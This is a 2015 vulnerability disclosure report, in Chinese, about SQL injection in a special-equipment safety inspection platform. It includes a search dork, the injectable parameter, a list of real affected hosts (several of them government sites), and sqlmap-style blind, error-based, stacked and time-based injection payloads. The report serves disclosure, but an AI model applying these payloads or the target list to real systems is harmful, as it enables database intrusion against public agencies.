wybug_title: 特种设备安全检查平台sa权限SQL注入漏洞，涉及各大省市地区
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-03-17：	细节已通知厂商并且等待厂商处理中									2015-03-17：	厂商已经确认，细节仅向厂商公开									2015-03-20：	细节向第三方安全合作伙伴开放									2015-05-11：	细节向核心白帽子及相关领域专家公开									2015-05-21：	细节向普通白帽子公开									2015-05-31：	细节向实习白帽子公开									2015-06-15：	细节向公众公开  简要描述： 特种设备安全检查平台sa权限SQL注入漏洞 详细说明：  统名称：特种设备安全检查平台系统结构：JSP+MSSQL关键字：inurl:until/select_sbbh.jsp

漏洞文件：until/select_sb.jsp注入参数：SYDWDQ_DM   漏洞证明：  部分案例如下：http://122.227.22.214:90/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://www.fjase.com/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://59.56.172.51/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://58.213.147.216/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://www.hljts.gov.cn/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://tzsb.gxqts.gov.cn/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://www.hntsw.gov.cn/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://www.sxtsaj.com/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://111.75.211.4/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://www.jxtzsb.cn/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=http://app.xjzj.gov.cn:8080/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=等漏洞验证：以http://122.227.22.214:90/until/select_sbbh.jsp?SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=aaaaa&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=为例：
Place: GETParameter: SYDWDQ_DM    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=%' AND 3578=3578 AND '%'='&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=%' AND 8904=CONVERT(INT,(CHAR(58) CHAR(103) CHAR(119) CHAR(108) CHAR(58) (SELECT (CASE WHEN (8904=8904) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(110) CHAR(98)CHAR(97) CHAR(58))) AND '%'='&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=%'; WAITFOR DELAY '0:0:5'--&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: SUPFORM=&SUPID=&SUPMC=&SUPDM=&SUPFRSB=&SUPMCVALUE=&SYDWDQ_DM=%' WAITFOR DELAY '0:0:5'--&SBZL_DM=&select=&SEARCHTJ=start&SZDQ=&SYDWMC=&SBZCBH=&zzdwmc=&SBBH_1=&DWNBBH_1=&CCBH_1=---

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-03-17 16:12 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无
